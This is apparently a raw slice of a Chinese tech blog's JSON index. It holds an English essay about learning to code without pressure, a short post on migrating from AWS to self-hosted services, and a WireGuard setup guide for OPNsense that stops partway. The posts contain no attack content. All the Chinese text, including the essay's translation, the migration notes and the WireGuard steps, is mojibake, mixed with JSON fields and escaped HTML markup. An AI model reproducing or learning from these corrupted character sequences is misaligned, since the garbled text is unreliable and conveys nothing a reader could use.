codeã€Codexã€Geminiï¼Œå„ç§æ¨¡å‹çº·è‡³æ²“æ¥ï¼Œå¿™ä¹±ä¸”è‡ªé¡¾ä¸æš‡ã€‚æ„Ÿè§‰å¾ˆæ…Œä¹±ï¼Œçœ‹åˆ°äº†è¿™ç¯‡å¥½æ–‡ï¼Œé¡¿æ—¶å®‰é™ä¸‹æ¥ã€‚æ…¢å°±æ˜¯å¿«ï¼Œæ…¢æ…¢æ¥ï¼ Coding Without Pressure: How Slowing Down Helped Me Learn Faster â€‹\nFor a long time, I thought learning to code had to feel intense. Daily goals. Long hours. Constant progress. If I wasnâ€™t exhausted, I felt like I wasnâ€™t doing enough.\nSo I pushed harder. More tutorials. More projects. More pressure.\nAnd somehowâ€¦ I learned less.\nIt took me a while to realize this simple truth\u0026hellip; I wasnâ€™t failing because I was slow; I was failing because I wouldnâ€™t let myself slow down.\nThe Pressure We Donâ€™t Talk About When youâ€™re learning to code, thereâ€™s an invisible timer in your head.\nâ€œI should understand this by now.â€ â€œIâ€™m behind everyone else.â€ â€œWhy does this take me so long?â€\nYou open Dev.to, LinkedIn, Twitter. Everyone seems to be building, shipping, improving\u0026hellip; fast.\nAnd suddenly, coding stops feeling like learning. It feels like a race you didnâ€™t sign up for.\nWhen Fast Learning Became Shallow Learning There was a phase where I â€œcoveredâ€ a lot of topics. JavaScript concepts. CSS tricks. Python basics.\nBut ask me to explain them deeply? Or apply them without guidance?\nThatâ€™s when things fell apart.\nI wasnâ€™t learning; I was consuming. Moving fast, but not moving forward.\nSlowing Down Wasnâ€™t Easy (At First) Slowing down felt wrong. Like I was being lazy. Like I was wasting time.\nBut instead of doing more, I tried doing less, intentionally.\nOne concept instead of five One small feature instead of a full app One file read carefully instead of ten skimmed And something unexpected happened.\nThings started to stick.\nWhat â€œSlow Learningâ€ Looks Like in Practice Slowing down doesnâ€™t mean doing nothing. It means doing things with attention.\nFor me, it looks like:\nReading my own code and asking why I wrote it that way Letting myself struggle before Googling Writing simple solutions instead of clever ones Taking breaks without guilt Stopping when my brain feels tired, not when the clock says so Thatâ€™s when learning became calmer and deeper.\nThe Confidence Shift Hereâ€™s the part nobody mentions: When you remove pressure, confidence quietly grows.\nYou stop comparing. You stop rushing to â€œfinish.â€ You start trusting your pace.\nAnd that trust changes everything.\nBugs donâ€™t feel personal anymore. Confusion feels temporary, not permanent. You stop asking, â€œAm I good enough?â€ And start asking, â€œWhat can I understand better?â€\nLearning Faster by Moving Slower Ironically, slowing down helped me learn faster.\nNot because I covered more topics\u0026hellip; but because I retained more.\nConcepts connected. Patterns became familiar. Mistakes turned into lessons instead of frustration.\nProgress stopped being loud\u0026hellip; but it became real.\nWhat I No Longer Do âŒ I donâ€™t rush to finish courses âŒ I donâ€™t force productivity on bad days âŒ I donâ€™t measure progress by speed âŒ I donâ€™t compare my chapter 3 to someone elseâ€™s chapter 20\nLearning isnâ€™t urgent\u0026hellip; Itâ€™s ongoing.\nFinal Thoughts (From One Developer to Another) If coding feels heavy right now, maybe itâ€™s not because youâ€™re bad at it. Maybe youâ€™re just carrying too much pressure.\nSlow down. Breathe. Write code at a pace you can understand, not just complete.\nYou donâ€™t need to be fast to be good. You need to be present.\nLearning to code isnâ€™t about racing\u0026hellip; itâ€™s about staying long enough to grow ğŸ’»\nWishing you patience, clarity, and joy in your coding journey, friends ğŸ’™.\nç¿»è¯‘å‡ºæ¥ï¼Œå…±å‹‰ï¼š æ— å‹å­¦ä¹ ç¼–ç¨‹ï¼šæ”¾æ…¢è„šæ­¥å¦‚ä½•åŠ©æˆ‘å­¦å¾—æ›´å¿« å¾ˆé•¿ä¸€æ®µæ—¶é—´é‡Œï¼Œæˆ‘éƒ½ä»¥ä¸ºå­¦ä¹ ç¼–ç¨‹å¿…é¡»æ˜¯é«˜å¼ºåº¦çš„ã€‚æ¯æ—¥ç›®æ ‡ã€é•¿æ—¶é—´æŠ•å…¥ã€æŒç»­ä¸æ–­çš„è¿›æ­¥ã€‚å¦‚æœæˆ‘è§‰å¾—ä¸ç´¯ï¼Œæˆ‘å°±ä¼šæ„Ÿè§‰è‡ªå·±åšå¾—è¿˜ä¸å¤Ÿã€‚\näºæ˜¯æˆ‘æ›´åŠ é€¼è¿«è‡ªå·±ã€‚æ›´å¤šçš„æ•™ç¨‹ã€æ›´å¤šçš„é¡¹ç›®ã€æ›´å¤§çš„å‹åŠ›ã€‚\nä½†ä¸çŸ¥æ€çš„â€¦â€¦æˆ‘å­¦åˆ°çš„åè€Œæ›´å°‘äº†ã€‚\næˆ‘èŠ±äº†å¥½ä¸€é˜µå­æ‰æ„è¯†åˆ°è¿™ä¸ªç®€å•çš„é“ç†â€¦â€¦æˆ‘ä¹‹æ‰€ä»¥å¤±è´¥ï¼Œä¸æ˜¯å› ä¸ºæˆ‘æ…¢ï¼Œè€Œæ˜¯å› ä¸ºæˆ‘ä¸è‚¯è®©è‡ªå·±æ…¢ä¸‹æ¥ã€‚\næˆ‘ä»¬é¿è€Œä¸è°ˆçš„å‹åŠ› å½“ä½ å­¦ä¹ ç¼–ç¨‹æ—¶ï¼Œä½ çš„è„‘æµ·é‡Œä»¿ä½›æœ‰ä¸€ä¸ªæ— å½¢çš„è®¡æ—¶å™¨ã€‚\nâ€œæˆ‘ç°åœ¨åº”è¯¥å·²ç»æ‡‚è¿™ä¸ªäº†ã€‚â€ â€œæˆ‘æ¯”æ‰€æœ‰äººéƒ½è½åäº†ã€‚â€ â€œä¸ºä»€ä¹ˆè¿™ä¸ªèŠ±äº†æˆ‘è¿™ä¹ˆé•¿æ—¶é—´ï¼Ÿâ€\nä½ æ‰“å¼€ Dev.toã€LinkedInã€Twitterã€‚ä¼¼ä¹æ¯ä¸ªäººéƒ½åœ¨å¿«é€Ÿåœ°æ„å»ºã€å‘å¸ƒã€ç²¾è¿›â€¦â€¦\nçªç„¶é—´ï¼Œç¼–ç¨‹ä¸å†åƒæ˜¯å­¦ä¹ ï¼Œè€Œåƒæ˜¯ä¸€åœºä½ å¹¶æœªæŠ¥åçš„æ¯”èµ›ã€‚\nå½“å¿«é€Ÿå­¦ä¹ å˜æˆæµ…è–„å­¦ä¹  æˆ‘æ›¾ç»å†è¿‡ä¸€ä¸ªâ€œè¦†ç›–â€äº†å¾ˆå¤šçŸ¥è¯†ç‚¹çš„é˜¶æ®µã€‚JavaScript çš„æ¦‚å¿µã€CSS çš„æŠ€å·§ã€Python çš„åŸºç¡€ã€‚\nä½†è¦æˆ‘æ·±å…¥è§£é‡Šå®ƒä»¬ï¼Ÿæˆ–è€…åœ¨æ²¡æœ‰æŒ‡å¯¼çš„æƒ…å†µä¸‹åº”ç”¨å®ƒä»¬ï¼Ÿ\né‚£æ—¶å€™ï¼Œä¸€åˆ‡éƒ½åˆ†å´©ç¦»æäº†ã€‚\næˆ‘ä¸æ˜¯åœ¨å­¦ä¹ ï¼Œè€Œæ˜¯åœ¨æ¶ˆè€—ã€‚èµ°å¾—å¾ˆå¿«ï¼Œå´æ²¡æœ‰å‰è¿›ã€‚\næ”¾æ…¢è„šæ­¥å¹¶ä¸å®¹æ˜“ï¼ˆä¸€å¼€å§‹ï¼‰ æ”¾æ…¢è„šæ­¥æ„Ÿè§‰å¾ˆä¸å¯¹åŠ²ã€‚å¥½åƒæˆ‘åœ¨å·æ‡’ï¼Œåœ¨æµªè´¹æ—¶é—´ã€‚\nä½†æˆ‘æ²¡æœ‰åšæ›´å¤šï¼Œè€Œæ˜¯å°è¯•ç€æœ‰æ„è¯†åœ°åšæ›´å°‘ã€‚\nä¸€æ¬¡åªå­¦ä¸€ä¸ªæ¦‚å¿µï¼Œè€Œä¸æ˜¯äº”ä¸ª ä¸€æ¬¡åªåšä¸€ä¸ªå°åŠŸèƒ½ï¼Œè€Œä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„åº”ç”¨ ä»”ç»†è¯»ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸æ˜¯è‰è‰æµè§ˆåä¸ª ç„¶åï¼Œæ„æƒ³ä¸åˆ°çš„äº‹æƒ…å‘ç”Ÿäº†ã€‚\nçŸ¥è¯†å¼€å§‹çœŸæ­£ç•™åœ¨è„‘å­é‡Œäº†ã€‚\nâ€œæ…¢å­¦ä¹ â€åœ¨å®è·µä¸­æ˜¯ä»€ä¹ˆæ ·çš„ æ”¾æ…¢è„šæ­¥ä¸ä»£è¡¨ä»€ä¹ˆéƒ½ä¸åšï¼Œè€Œæ˜¯æŒ‡ä¸“æ³¨åœ°åšäº‹ã€‚\nå¯¹æˆ‘æ¥è¯´ï¼Œå®ƒçœ‹èµ·æ¥æ˜¯è¿™æ ·çš„ï¼š\né˜…è¯»è‡ªå·±å†™çš„ä»£ç ï¼Œå¹¶é—®è‡ªå·±ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆå†™ åœ¨æ±‚åŠ©äºè°·æ­Œä¹‹å‰ï¼Œå…ˆè®©è‡ªå·±æŒ£æ‰ä¸€ä¼šå„¿ å†™ç®€å•çš„è§£å†³æ–¹æ¡ˆï¼Œè€Œä¸æ˜¯èŠ±å“¨çš„ æ¯«æ— è´Ÿç½ªæ„Ÿåœ°ä¼‘æ¯ åœ¨å¤§è„‘æ„Ÿåˆ°ç–²æƒ«æ—¶å°±åœä¸‹æ¥ï¼Œè€Œä¸æ˜¯å¬ä»æ—¶é’Ÿçš„å®‰æ’ å°±åœ¨è¿™æ—¶ï¼Œå­¦ä¹ å˜å¾—æ›´å¹³é™ã€æ›´æ·±å…¥äº†ã€‚\nä¿¡å¿ƒçš„è½¬å˜ è¿™æ˜¯æ²¡äººæè¿‡çš„éƒ¨åˆ†ï¼šå½“ä½ ç§»é™¤äº†å‹åŠ›ï¼Œè‡ªä¿¡ä¾¿ä¼šæ‚„ç„¶å¢é•¿ã€‚\nä½ ä¸å†æ¯”è¾ƒã€‚ä½ ä¸å†æ€¥äºâ€œå®Œæˆâ€ã€‚ä½ å¼€å§‹ç›¸ä¿¡è‡ªå·±çš„èŠ‚å¥ã€‚\nè€Œè¿™ç§ä¿¡ä»»ä¼šæ”¹å˜ä¸€åˆ‡ã€‚\nBug ä¸å†åƒæ˜¯ä¸ªäººçš„å¤±è´¥ã€‚å›°æƒ‘åªæ˜¯æš‚æ—¶çš„ï¼Œè€Œéæ°¸ä¹…çš„ã€‚ä½ ä¸å†é—®â€œæˆ‘å¤Ÿå¥½å—ï¼Ÿâ€ï¼Œè€Œæ˜¯å¼€å§‹é—®â€œæˆ‘æ€æ ·æ‰èƒ½æ›´å¥½åœ°ç†è§£ï¼Ÿâ€\né€šè¿‡æ”¾æ…¢è„šæ­¥ï¼Œå­¦å¾—æ›´å¿« è®½åˆºçš„æ˜¯ï¼Œæ”¾æ…¢è„šæ­¥å¸®åŠ©æˆ‘å­¦å¾—æ›´å¿«äº†ã€‚\nä¸æ˜¯å› ä¸ºæˆ‘è¦†ç›–äº†æ›´å¤šçš„ä¸»é¢˜â€¦â€¦è€Œæ˜¯å› ä¸ºæˆ‘è®°ä½äº†æ›´å¤šã€‚\næ¦‚å¿µä¹‹é—´å¼€å§‹è”ç³»èµ·æ¥ã€‚æ¨¡å¼å˜å¾—ç†Ÿæ‚‰ã€‚é”™è¯¯å˜æˆäº†æ•™è®­ï¼Œè€Œä¸æ˜¯æŒ«è´¥æ„Ÿã€‚\nè¿›æ­¥ä¸å†å–§åš£â€¦â€¦ä½†å®ƒå˜å¾—çœŸå®ã€‚\næˆ‘ä¸å†åšçš„äº‹ âŒ æˆ‘ä¸å†æ€¥äºå®Œæˆè¯¾ç¨‹ âŒ æˆ‘ä¸å†åœ¨çŠ¶æ€ä¸å¥½çš„æ—¥å­é‡Œå¼ºè¿«è‡ªå·±æé«˜æ•ˆç‡ âŒ æˆ‘ä¸å†ç”¨é€Ÿåº¦æ¥è¡¡é‡è¿›æ­¥ âŒ æˆ‘ä¸å†æ‹¿è‡ªå·±çš„ç¬¬ä¸‰ç« å»å’Œåˆ«äººçš„ç¬¬äºŒåç« æ¯”è¾ƒ\nå­¦ä¹ ä¸æ˜¯ä¸€ä»¶ç´§æ€¥çš„äº‹â€¦â€¦å®ƒæ˜¯ä¸€ä¸ªæŒç»­çš„è¿‡ç¨‹ã€‚\næœ€åçš„æƒ³æ³•ï¼ˆä»ä¸€ä¸ªå¼€å‘è€…åˆ°å¦ä¸€ä¸ªï¼‰ å¦‚æœç¼–ç¨‹æ­¤åˆ»è®©ä½ æ„Ÿåˆ°æ²‰é‡ï¼Œä¹Ÿè®¸ä¸æ˜¯å› ä¸ºä½ å­¦å¾—ä¸å¥½ï¼Œä¹Ÿè®¸åªæ˜¯å› ä¸ºä½ èƒŒè´Ÿäº†å¤ªå¤šçš„å‹åŠ›ã€‚\næ…¢ä¸‹æ¥ã€‚æ·±å‘¼å¸ã€‚ä»¥ä½ èƒ½ç†è§£çš„é€Ÿåº¦å»å†™ä»£ç ï¼Œè€Œä¸ä»…ä»…æ˜¯å®Œæˆå®ƒã€‚\nä½ ä¸å¿…è¿½æ±‚é€Ÿåº¦æ‰ç®—ä¼˜ç§€ï¼Œä½ éœ€è¦çš„æ˜¯ä¸“æ³¨å½“ä¸‹ã€‚\nå­¦ä¹ ç¼–ç¨‹ä¸æ˜¯ä¸€åœºèµ›è·‘â€¦â€¦è€Œæ˜¯è¦å¾…å¾—è¶³å¤Ÿä¹…ï¼Œæ‰èƒ½æˆé•¿ ğŸ’»\næœ‹å‹ä»¬ï¼Œæ„¿ä½ åœ¨ç¼–ç¨‹ä¹‹æ—…ä¸­æ‹¥æœ‰è€å¿ƒã€æ€è·¯æ¸…æ™°å’Œå–œæ‚¦ ğŸ’™ã€‚\n","permalink":"https://rendoumi.com/posts/20251230-learn/","summary":"\u003ch4 id=\"devto-ä¸Šé¢æœ‰ä¸€ç¯‡æ·±åº¦å¥½æ–‡æœ€è¿‘åœ¨å­œå­œä¸å€¦çš„å­¦ä¹ aiæ„Ÿè§‰ä»€ä¹ˆcluaude-codecodexgeminiå„ç§æ¨¡å‹çº·è‡³æ²“æ¥å¿™ä¹±ä¸”è‡ªé¡¾ä¸æš‡æ„Ÿè§‰å¾ˆæ…Œä¹±çœ‹åˆ°äº†è¿™ç¯‡å¥½æ–‡é¡¿æ—¶å®‰é™ä¸‹æ¥æ…¢å°±æ˜¯å¿«æ…¢æ…¢æ¥\"\u003eDev.to ä¸Šé¢æœ‰ä¸€ç¯‡æ·±åº¦å¥½æ–‡ï¼Œæœ€è¿‘åœ¨å­œå­œä¸å€¦çš„å­¦ä¹ AIï¼Œæ„Ÿè§‰ä»€ä¹ˆCluaude codeã€Codexã€Geminiï¼Œå„ç§æ¨¡å‹çº·è‡³æ²“æ¥ï¼Œå¿™ä¹±ä¸”è‡ªé¡¾ä¸æš‡ã€‚æ„Ÿè§‰å¾ˆæ…Œä¹±ï¼Œçœ‹åˆ°äº†è¿™ç¯‡å¥½æ–‡ï¼Œé¡¿æ—¶å®‰é™ä¸‹æ¥ã€‚æ…¢å°±æ˜¯å¿«ï¼Œæ…¢æ…¢æ¥ï¼\u003c/h4\u003e\n\u003ch1 id=\"coding-without-pressure-how-slowing-down-helped-me-learn-faster\"\u003eCoding Without Pressure: How Slowing Down Helped Me Learn Faster\u003c/h1\u003e\n\u003cp\u003eâ€‹\u003c/p\u003e\n\u003cp\u003eFor a long time, I thought learning to code had to feel intense.\nDaily goals. Long hours. Constant progress.\nIf I wasnâ€™t exhausted, I felt like I wasnâ€™t doing enough.\u003c/p\u003e\n\u003cp\u003eSo I pushed harder.\nMore tutorials. More projects. More pressure.\u003c/p\u003e\n\u003cp\u003eAnd somehowâ€¦ I learned \u003cem\u003eless\u003c/em\u003e.\u003c/p\u003e\n\u003cp\u003eIt took me a while to realize this simple truth\u0026hellip;\n\u003cstrong\u003eI wasnâ€™t failing because I was slow; I was failing because I wouldnâ€™t let myself slow down.\u003c/strong\u003e\u003c/p\u003e","title":"å…³äºå­¦ä¹ ï¼Œå…³äºAI"},{"content":"æœ¬ç¯‡æ˜¯å™è¿°æ–‡ï¼Œæ²¡æœ‰æŠ€æœ¯å«é‡ï¼Œçº¯çº¯çš„è®°å½•ä¸€ä¸‹\né‚£åœ¨25å¹´9æœˆä»½çš„æ—¶å€™ï¼ŒæŠŠAWSçš„æ•´ä¸ªæ¶æ„ç»™å¹³ç§»åˆ°VPSçš„æœºæˆ¿äº†\nä¸ºä»€ä¹ˆå‘¢ï¼ŸAWSçš„è´¹ç”¨å®åœ¨æ˜¯å¤ªè´µäº†\nå„ç§æœåŠ¡éƒ½æ˜¯è¦é’±çš„ï¼Œä»€ä¹ˆMysqlçš„proxyï¼Œè·Ÿå®ä¾‹ä¸€ä¸ªä»·æ ¼äº†ï¼›è¿˜æœ‰ä»€ä¹ˆSerurity hubï¼ŒCloudwatchç­‰ç­‰ç­‰ç­‰\nç”¨åˆ°äº†å°±å¾—äº¤é’±ï¼Œå‡ºæ•…éšœçš„æ—¶å€™ï¼Œè¿˜å¾—ä¹°å®¢æœæ”¯æŒæœåŠ¡ï¼Œå„ç§å¥‡æŠ€æ·«å·§\nçœ‹æ—¥å¿—å‘å‘Šè­¦ç”¨Cloudwatchæ˜¯æœ€å¿«æœ€ä¾¿æ·çš„ï¼Œä½†æ˜¯è´µå•Šï¼Œæœ€ä½³å®è·µæ˜¯ä»åˆ°S3æ¡¶é‡Œï¼Œç”¨ Athena åˆ†æ\næ¯ä¸ªæœˆéƒ½è¦å…³æ³¨saveing planï¼Œçœ‹çœ‹è¶…äº†æ²¡æœ‰ï¼Œå®åœ¨æ˜¯å¿æ— å¯å¿\nè€Œä¸”è¢«è¿«å‡çº§ï¼Œç”¨çš„æœåŠ¡å„ç§é˜‰å‰²\nredisæœåŠ¡åªæ”¯æŒä¸€ä¸ªåº“ï¼Œè¢«è¿«å‡çº§åˆ°valkey, ç»“æœvalkeyä¸æ”¯æŒredis-exporterï¼Œè¢«é€¼æ— å¥ˆåªå¥½ç”¨ç¤¾åŒºçš„redis.io\nalermanagerä¸æ”¯æŒwebhookï¼Œåªèƒ½å‘åˆ°SNS\næ— è¯­äº†ï¼Œè€Œä¸”æœ€ä½³å®è·µå¤ªå¤šï¼Œæ¯æ¬¡éƒ½å¾—ç ”ç©¶åŠå¤©ä»€ä¹ˆæ‰æ˜¯æœ€åˆé€‚è‡ªå·±å¾—\nå†™ä¸ªTerrfaformï¼Œä»£ç æ€»å…±2åƒè¡Œï¼Œæœ‰1000è¡Œæ˜¯IAMçš„æƒé™é…ç½®\nç»ˆäºç»ˆäºæŒªäº†\né‚£å„ç§æœåŠ¡å¿…é¡»æœ‰ç›¸åº”çš„æ›¿ä»£äº§å“ï¼Œé‚£æ€»ç»“ä¸€ä¸‹ï¼š\nLoadbalance + Firewallï¼šå°±ç”¨OPNSenseæ›¿ä»£\nKubernetes: ç”¨kubersprayæ‰‹æ“\nRedis: è‡ªå»ºredis\nPostgreså’ŒMysql: æ‰‹æ“ï¼Œç”¨pgbackrestå¤‡ä»½ã€‚MySQLæ¯å¤©fullbackup\nS3: ç”¨seeweedfsæ›¿ä»£ï¼Œå®Œç¾æ›¿æ¢ï¼Œæ”¯æŒå„ç§IAMæ›¿ä»£ï¼Œé™æ€åŒ–ç”¨Caddyæ¥é¡¶æ›¿\ncloudfrontï¼šå…¶å®ƒå®¶CDN\nElasticsearch: è‡ªå»ºï¼Œå–æ¶ˆè¯ä¹¦\nMongoDBï¼š è‡ªå»º\nKafkaï¼šè‡ªå»ºï¼Œkraftæ¢æ‰zookeeper\nflinkï¼šè‡ªå»º\nmilvusï¼šè‡ªå»º\n","permalink":"https://rendoumi.com/posts/20251217-aws_migrate/","summary":"\u003cp\u003eæœ¬ç¯‡æ˜¯å™è¿°æ–‡ï¼Œæ²¡æœ‰æŠ€æœ¯å«é‡ï¼Œçº¯çº¯çš„è®°å½•ä¸€ä¸‹\u003c/p\u003e\n\u003cp\u003eé‚£åœ¨25å¹´9æœˆä»½çš„æ—¶å€™ï¼ŒæŠŠAWSçš„æ•´ä¸ªæ¶æ„ç»™å¹³ç§»åˆ°VPSçš„æœºæˆ¿äº†\u003c/p\u003e\n\u003cp\u003eä¸ºä»€ä¹ˆå‘¢ï¼ŸAWSçš„è´¹ç”¨å®åœ¨æ˜¯å¤ªè´µäº†\u003c/p\u003e\n\u003cp\u003eå„ç§æœåŠ¡éƒ½æ˜¯è¦é’±çš„ï¼Œä»€ä¹ˆMysqlçš„proxyï¼Œè·Ÿå®ä¾‹ä¸€ä¸ªä»·æ ¼äº†ï¼›è¿˜æœ‰ä»€ä¹ˆSerurity hubï¼ŒCloudwatchç­‰ç­‰ç­‰ç­‰\u003c/p\u003e\n\u003cp\u003eç”¨åˆ°äº†å°±å¾—äº¤é’±ï¼Œå‡ºæ•…éšœçš„æ—¶å€™ï¼Œè¿˜å¾—ä¹°å®¢æœæ”¯æŒæœåŠ¡ï¼Œå„ç§å¥‡æŠ€æ·«å·§\u003c/p\u003e\n\u003cp\u003eçœ‹æ—¥å¿—å‘å‘Šè­¦ç”¨Cloudwatchæ˜¯æœ€å¿«æœ€ä¾¿æ·çš„ï¼Œä½†æ˜¯è´µå•Šï¼Œæœ€ä½³å®è·µæ˜¯ä»åˆ°S3æ¡¶é‡Œï¼Œç”¨ Athena åˆ†æ\u003c/p\u003e\n\u003cp\u003eæ¯ä¸ªæœˆéƒ½è¦å…³æ³¨saveing planï¼Œçœ‹çœ‹è¶…äº†æ²¡æœ‰ï¼Œå®åœ¨æ˜¯å¿æ— å¯å¿\u003c/p\u003e\n\u003cp\u003eè€Œä¸”è¢«è¿«å‡çº§ï¼Œç”¨çš„æœåŠ¡å„ç§é˜‰å‰²\u003c/p\u003e\n\u003cp\u003eredisæœåŠ¡åªæ”¯æŒä¸€ä¸ªåº“ï¼Œè¢«è¿«å‡çº§åˆ°valkey, ç»“æœvalkeyä¸æ”¯æŒredis-exporterï¼Œè¢«é€¼æ— å¥ˆåªå¥½ç”¨ç¤¾åŒºçš„redis.io\u003c/p\u003e\n\u003cp\u003ealermanagerä¸æ”¯æŒwebhookï¼Œåªèƒ½å‘åˆ°SNS\u003c/p\u003e\n\u003cp\u003eæ— è¯­äº†ï¼Œè€Œä¸”æœ€ä½³å®è·µå¤ªå¤šï¼Œæ¯æ¬¡éƒ½å¾—ç ”ç©¶åŠå¤©ä»€ä¹ˆæ‰æ˜¯æœ€åˆé€‚è‡ªå·±å¾—\u003c/p\u003e\n\u003cp\u003eå†™ä¸ªTerrfaformï¼Œä»£ç æ€»å…±2åƒè¡Œï¼Œæœ‰1000è¡Œæ˜¯IAMçš„æƒé™é…ç½®\u003c/p\u003e\n\u003cp\u003eç»ˆäºç»ˆäºæŒªäº†\u003c/p\u003e\n\u003cp\u003eé‚£å„ç§æœåŠ¡å¿…é¡»æœ‰ç›¸åº”çš„æ›¿ä»£äº§å“ï¼Œé‚£æ€»ç»“ä¸€ä¸‹ï¼š\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eLoadbalance + Firewallï¼šå°±ç”¨OPNSenseæ›¿ä»£\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKubernetes:  ç”¨kubersprayæ‰‹æ“\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eRedis: è‡ªå»ºredis\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ePostgreså’ŒMysql: æ‰‹æ“ï¼Œç”¨pgbackrestå¤‡ä»½ã€‚MySQLæ¯å¤©fullbackup\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eS3: ç”¨seeweedfsæ›¿ä»£ï¼Œå®Œç¾æ›¿æ¢ï¼Œæ”¯æŒå„ç§IAMæ›¿ä»£ï¼Œé™æ€åŒ–ç”¨Caddyæ¥é¡¶æ›¿\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003ecloudfrontï¼šå…¶å®ƒå®¶CDN\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eElasticsearch: è‡ªå»ºï¼Œå–æ¶ˆè¯ä¹¦\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eMongoDBï¼š è‡ªå»º\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eKafkaï¼šè‡ªå»ºï¼Œkraftæ¢æ‰zookeeper\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eflinkï¼šè‡ªå»º\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003emilvusï¼šè‡ªå»º\u003c/p\u003e\n\u003c/li\u003e\n\u003c/ul\u003e","title":"AWSçš„è¿ç§»æ›¿æ¢"},{"content":"å±…ç„¶èŠ±äº†ä¸€æ™šä¸Šå’Œä¸€æ•´å¤©çš„æ—¶é—´æ¥é…ç½®è¿™ä¸ªï¼ŒçœŸçš„æ˜¯å¤§å‡ºæ‰€æ–™ï¼Œåœ¨æœ€æµ…æ˜¾çš„åœ°æ–¹æ ½äº†æœ€å¤§çš„è·Ÿå¤´\nå› ä¸ºä¹‹å‰é…ç½®çš„æ—¶å€™éƒ½å¤ªç—›å¿«äº†ï¼Œ5åˆ†é’Ÿï¼Œç„¶åæ”¾è·¯ç”±ï¼Œå°±okäº†ï¼Œç»“æœè¿™æ¬¡å°±ç»“ç»“å®å®ç¿»è½¦äº†ï¼\nå…ˆè¯´æœ€å¤§çš„åŸå› ï¼šå¢™ï¼Œæ— è§†å¢™çš„å­˜åœ¨ï¼Œå¿…ç„¶è¢«å¢™åå™¬ï¼Œæœ¬æ¥ç®€å•çš„äº‹æƒ…ä¹Ÿå˜å¾—å¤æ‚ã€‚\næ³¨æ„äº‹é¡¹ï¼Œæ™®é€šé…å…¶å®å¾ˆç®€å•ï¼Œä½†æ˜¯å‡ºä¹æ„æ–™çš„è¿˜æœ‰MTUç­‰ç€ä½ ï¼Œå› ä¸ºVPSè¢«å¼ºåˆ¶æ”¹äº†MTUï¼Œæ‰€ä»¥è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªå‘ï¼Œæ™®é€šçš„ä¸ä¼šé‡åˆ°è¿™ä¸ªæƒ…å†µã€‚\nè®°å½•ä¸€ä¸‹è¿‡ç¨‹ï¼š\né¦–å…ˆï¼ŒOPNSenseè€ç‰ˆæœ¬çš„éœ€è¦å®‰è£…æ’ä»¶os-wireguardï¼Œä½†æ–°ç‰ˆæœ¬å·²ç»å†…ç½®wireguardäº†ï¼Œå®Œå…¨ä¸ç”¨å®‰è£…\nå·¦è¾¹æ çœ‹ä¸€ä¸‹ï¼Œæœ‰å°±OKï¼Œä¸ç”¨å®‰è£…\nç„¶åæˆ‘ä»¬å…ˆå»WireGuardçš„Instancesï¼Œåˆå§‹æ˜¯ç©ºç™½çš„ï¼Œé‚£å°±æŒ‰+å·æ·»åŠ ä¸€ä¸ªæ–°çš„å®ä¾‹\néœ€è¦å¡«å†™ä»¥ä¸‹å‡ é¡¹\nNameï¼šWG-LC\nInstanceæ˜¯0ï¼Œè¡¨ç¤ºè¿™ä¸ªå®ä¾‹ä¼šæ˜¯wg0è¿™ä¸ªç½‘å¡\næŒ‰é½¿è½®Genå‡ºseverçš„ Public keyå’ŒPrivate key\nLIsten portï¼š51821 é‡‡ç”¨éæ ‡ç«¯å£ï¼Œæ˜¯UDPç±»å‹çš„ç«¯å£\nTunnel addressï¼šè¡¨æ˜wg0ç½‘å¡æ‰€åœ¨çš„ç½‘æ®µï¼Œ10.100.100.1æ˜¯æœåŠ¡å™¨çš„åœ°å€\nç„¶åå¡«å®Œç‚¹å‡»Saveå°±OKäº†\nè¿”å›åï¼Œé€‰ä¸­Enable WireGuardï¼Œç„¶åApplyï¼Œå°±ä¼šå¯åŠ¨æœåŠ¡äº†ã€‚\næ¥ç€å»genå®¢æˆ·ç«¯é…ç½®ï¼š\nåˆ° Peer generatorï¼Œå¡«å…¥ä»¥ä¸‹å†…å®¹\nNameï¼šå®¢æˆ·ç«¯åç§°ï¼Œèµ·ä¸ªZRRï¼Œå¥½è®¤ Addressï¼šä¼šè‡ªåŠ¨æŒ‰åºåˆ—ç”Ÿæˆï¼Œè¿™é‡Œæ˜¯10.100.100.2/32 Allowed IPsï¼šè¿™é‡Œéå¸¸å…³é”®ï¼Œä¸€å®šä¸èƒ½å¡«0.0.0.0ï¼Œé‚£ç›¸å½“äºæ‰€æœ‰è·¯ç”±éƒ½èµ°è¿™ä¸ªwgéš§é“äº†ï¼Œæ‰€ä»¥ä¸€å®šè¦æŒ‡å®šè‡ªå·±è¦èµ°çš„è·¯ç”±ï¼Œé¦–å…ˆæ˜¯wg0çš„ç½‘æ®µ10.100.100.0/24ï¼Œç„¶åæ˜¯å†…ç½‘çš„192.168.99.0/24 ç„¶åä¸€å®šè¦æŠŠConfigçš„é…ç½®ç»™æ‹·è´å‡ºæ¥å¤‡ç”¨ æœ€åç‚¹å‡» Store and generate nexeçš„æŒ‰é’®ï¼Œä¸è¦ç‚¹Applyé‚£ä¸ª ç„¶åå°±OKäº†ï¼Œå›åˆ° Peers é¡µçœ‹çœ‹ï¼Œå¤šäº†ä¸€ä¸ªZRRçš„å¯¹ç«¯ï¼Œå°±æ²¡é—®é¢˜\nç»§ç»­ï¼Œéœ€è¦é…ç½®æ¥å£å’Œé˜²ç«å¢™è§„åˆ™\nå·¦è¾¹æ ï¼ŒInterfaces \u0026ndash;\u0026gt; 